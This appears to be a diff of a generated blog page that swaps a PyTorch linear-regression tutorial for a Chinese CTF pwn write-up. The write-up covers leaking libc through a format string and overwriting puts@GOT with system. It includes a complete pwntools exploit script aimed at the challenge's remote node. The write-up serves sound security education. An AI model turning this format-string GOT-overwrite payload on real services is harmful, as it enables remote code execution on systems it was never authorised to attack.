@@ -16,24 +16,25 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="ai基础知识补习">
+    <meta name="description" content="...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linear regression 2">
-<meta property="og:url" content="https://isolator-1.github.io/2023/11/19/ai/linear%20regression%202/index.html">
+<meta property="og:title" content="格式化字符串修改got表">
+<meta property="og:url" content="https://isolator-1.github.io/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="ai基础知识补习">
+<meta property="og:description" content="...">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-11-18T17:00:00.000Z">
-<meta property="article:modified_time" content="2023-11-21T12:27:05.824Z">
+<meta property="article:published_time" content="2023-11-27T05:12:00.000Z">
+<meta property="article:modified_time" content="2023-12-04T06:45:43.761Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="pytorch">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="fmt">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>linear regression 2 - Isolator&#39;s Blog</title>
+  <title>格式化字符串修改got表 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -71,7 +72,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -212,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="linear regression 2"></span>
+            <span id="subtitle" data-typed-text="格式化字符串修改got表"></span>
           
         </div>
 
@@ -223,8 +224,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-11-19 01:00" pubdate>
-          November 19, 2023 am
+        <time datetime="2023-11-27 13:12" pubdate>
+          November 27, 2023 pm
         </time>
       </span>
     
@@ -235,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k words
+          1.2k words
         
       </span>
     
@@ -246,7 +247,7 @@
         
         
         
-          14 mins
+          11 mins
         
       </span>
     
@@ -284,79 +285,19 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">linear regression 2</h1>
+            <h1 style="display: none">格式化字符串修改got表</h1>
             
             
               <div class="markdown-body">
                 
-                <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure>
+                <h3 id="NewStar2023-puts-or-system"><a href="#NewStar2023-puts-or-system" class="headerlink" title="NewStar2023 puts or system"></a>NewStar2023 puts or system</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p>
+<p>通过%s泄露libc</p>
+<p>目的是通过<code>b&#39;a&#39; * 4 + b&#39;%?$s&#39; + p64(puts_got)</code>把puts_got当成字符串的地址，打印got表项</p>
+<p>4个a和<code>%?$s</code>加起来正好是8个字节。</p>
+<p>在获取是第几个%s的时候，由于不能像%p那样一直%s%s%s%s…..，因为%s如果作为地址取内容失败会崩溃</p>
+<p>所以在第一次试的时候就要用 <code>&#39;a&#39; * 8 + &#39;b&#39; * 8</code> （8个a代表原本的4个a和%?$s，8个b代表puts的got表地址），然后再加上%p%p%p%p%p%p%p%p……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./putsorsys&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27515</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset = <span class="hljs-number">8</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;%9$s&#x27;</span> + p64(puts_got)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys_addr))<br><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload = fmtstr_payload(offset, &#123;puts_got:sys_addr&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
 
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">true_w = torch.tensor([<span class="hljs-number">2</span>, -<span class="hljs-number">3.4</span>])<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = d2l.synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br><span class="hljs-built_in">print</span>(features.shape, labels.shape)<br></code></pre></td></tr></table></figure>
-
-<pre><code class="hljs">torch.Size([1000, 2]) torch.Size([1000, 1])
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_array</span>(<span class="hljs-params">data_arrays, batch_size ,is_train=<span class="hljs-literal">True</span></span>):<br>    dataset = data.TensorDataset(*data_arrays)<br>    <span class="hljs-keyword">return</span> data.DataLoader(dataset, batch_size, shuffle=is_train)<br></code></pre></td></tr></table></figure>
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">batchsize = <span class="hljs-number">10</span><br>data_iter = load_array((features, labels), batchsize)<br><span class="hljs-built_in">next</span>(<span class="hljs-built_in">iter</span>(data_iter))<br></code></pre></td></tr></table></figure>
-
-
-
-
-<pre><code class="hljs">[tensor([[ 0.5940, -1.2375],
-         [-0.0840, -0.2979],
-         [-0.6866, -0.0931],
-         [-0.7088,  1.3270],
-         [ 1.0423,  0.6539],
-         [ 0.8156,  0.4527],
-         [ 0.5195, -0.3563],
-         [ 1.5992, -0.2122],
-         [ 0.9235,  0.7968],
-         [ 1.7633,  1.0517]]),
- tensor([[ 9.6162],
-         [ 5.0296],
-         [ 3.1477],
-         [-1.7288],
-         [ 4.0441],
-         [ 4.2969],
-         [ 6.4594],
-         [ 8.1204],
-         [ 3.3252],
-         [ 4.1758]])]
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br>net = nn.Sequential(nn.Linear(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<br>net[<span class="hljs-number">0</span>].weight.data.normal_(<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>)<br>net[<span class="hljs-number">0</span>].bias.data.fill_(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-
-
-
-
-<pre><code class="hljs">tensor([0.])
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.MSELoss()<br>trainer = torch.optim.SGD(net.parameters(), lr = <span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure>
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>        l = loss(net(X) ,y)<br>        trainer.zero_grad()<br>        l.backward()<br>        trainer.step()<br>    l = loss(net(features), labels)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;l:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
-<pre><code class="hljs">epoch 1, loss 0.000310
-epoch 2, loss 0.000098
-epoch 3, loss 0.000098
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w = net[<span class="hljs-number">0</span>].weight.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w的估计误差：&#x27;</span>, true_w - w.reshape(true_w.shape))<br>b = net[<span class="hljs-number">0</span>].bias.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b的估计误差：&#x27;</span>, true_b - b)<br></code></pre></td></tr></table></figure>
-
-<pre><code class="hljs">w的估计误差： tensor([0.0002, 0.0010])
-b的估计误差： tensor([0.0007])
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(net)<br></code></pre></td></tr></table></figure>
-
-<pre><code class="hljs">Sequential(
-  (0): Linear(in_features=2, out_features=1, bias=True)
-)
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w_grad = net[<span class="hljs-number">0</span>].weight.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w的梯度：&#x27;</span>, w_grad)<br>b_grad = net[<span class="hljs-number">0</span>].bias.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b的梯度：&#x27;</span>, b_grad)<br></code></pre></td></tr></table></figure>
-
-<pre><code class="hljs">w的梯度： tensor([[0.0019, 0.0058]])
-b的梯度： tensor([0.0047])
-</code></pre>
 
                 
               </div>
@@ -375,7 +316,7 @@ b的梯度： tensor([0.0047])
     
       <span class="category-chain">
         
-  <a href="/categories/pytorch/" class="category-chain-item">pytorch</a>
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
   
   
 
@@ -390,7 +331,9 @@ b的梯度： tensor([0.0047])
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/pytorch/">#pytorch</a>
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+        <a href="/tags/fmt/">#fmt</a>
       
     </div>
   
@@ -402,8 +345,8 @@ b的梯度： tensor([0.0047])
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>linear regression 2</div>
-      <div>https://isolator-1.github.io/2023/11/19/ai/linear regression 2/</div>
+      <div>格式化字符串修改got表</div>
+      <div>https://isolator-1.github.io/2023/11/27/ctf-pwn/格式化字符串泄露gots表地址/</div>
     </div>
     <div class="license-meta">
       
@@ -415,7 +358,7 @@ b的梯度： tensor([0.0047])
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 19, 2023</div>
+          <div>November 27, 2023</div>
         </div>
       
       
@@ -447,9 +390,9 @@ b的梯度： tensor([0.0047])
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/19/ai/linear%20regression/" title="linear regression">
+                      <a href="/2023/11/27/ctf-pwn/srop/" title="SROP">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">linear regression</span>
+                        <span class="hidden-mobile">SROP</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -457,8 +400,8 @@ b的梯度： tensor([0.0047])
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/19/ai/softmax%20image%20classification%202/" title="softmax image classfication 2">
-                        <span class="hidden-mobile">softmax image classfication 2</span>
+                      <a href="/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="PIE Format String">
+                        <span class="hidden-mobile">PIE Format String</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
